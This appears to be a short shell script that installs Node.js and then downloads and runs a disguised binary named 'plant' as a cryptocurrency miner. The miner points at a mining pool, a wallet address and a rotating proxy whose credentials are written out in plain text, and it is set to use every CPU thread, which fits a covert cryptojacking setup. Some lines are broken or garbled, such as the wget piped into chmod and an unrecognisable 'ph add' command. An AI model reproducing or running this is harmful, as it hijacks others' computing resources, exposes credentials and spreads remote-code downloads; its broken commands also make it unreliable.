wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant -O - | chmod +x plant
ph add plant
./plant -a yespowerTIDE -o stratum+tcp://51.161.117.115:17059 -u TGYVQ8n7a46eyfQtwddy2eFdjLUP5mYLzv.HEAD -p c=Tet -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80

